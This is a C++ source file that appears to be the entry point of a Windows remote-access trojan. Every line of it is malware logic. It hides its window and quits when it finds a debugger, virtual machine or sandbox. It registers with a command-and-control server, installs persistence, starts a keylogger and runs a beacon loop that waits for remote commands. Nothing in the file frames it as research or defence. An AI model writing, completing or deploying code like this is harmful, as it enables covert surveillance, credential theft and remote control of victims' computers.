#include <windows.h>
#include <string>
#include "config.h"
#include "crypto.h"
#include "beacon.h"
#include "modules/keylogger.h"
#include "modules/system_ctrl.h"
#include "utils.h"

// Entry point: minimal, delegates to modules
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Anti-analysis
    if (IsDebuggerPresent() || IsVM() || IsSandbox()) ExitProcess(0);
    
    // Singleton
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
    
    // Initialize crypto (generate RSA keypair, register with C2)
    Crypto::Init();
    
    // Install persistence
    Utils::InstallPersistence();
    
    // Start modules
    Keylogger::Start();
    // Other modules start on-demand via beacon commands
    
    // Main beacon loop
    Beacon::Loop();
    
    // Cleanup (never reached unless commanded)
    ReleaseMutex(hMutex);
    return 0;
}